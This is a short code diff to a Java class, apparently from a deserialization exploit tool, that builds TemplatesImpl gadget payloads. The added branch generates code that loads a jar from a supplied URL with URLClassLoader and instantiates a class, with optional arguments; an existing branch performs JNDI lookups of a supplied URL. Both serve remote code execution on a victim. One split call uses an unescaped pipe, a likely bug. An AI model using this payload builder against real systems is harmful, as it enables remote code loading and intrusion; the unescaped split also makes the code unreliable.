@@ -83,10 +83,16 @@ public class TemplatesImplUtil {
             String cmdInfo = command.substring(COMMAND_LOADJAR.length());
             String jarpath = cmdInfo.split("\\|")[0];
             String className = cmdInfo.split("\\|")[1];
+            cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
+                "classLoader.loadClass(\"%s\").newInstance();",jarpath,className);
+        } else if(command.toLowerCase().contains(COMMAND_LOADJAR_WITH_ARGS)) {
+            String cmdInfo = command.substring(COMMAND_LOADJAR_WITH_ARGS.length());
+            String jarpath = cmdInfo.split("\\|")[0];
+            String className = cmdInfo.split("\\|")[1];
             String args = cmdInfo.split("|")[2];
             cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                 "classLoader.loadClass(\"%s\").getConstructor(String.class).newInstance(\"%s\");",jarpath,className,args);
-        } else if (command.toLowerCase().contains(COMMAND_JNDI)){
+        }else if (command.toLowerCase().contains(COMMAND_JNDI)){
             String jndiURL = command.substring(COMMAND_JNDI.length());
             cmd = String.format("new javax.naming.InitialContext().lookup(\"%s\");",jndiURL);
         } else {
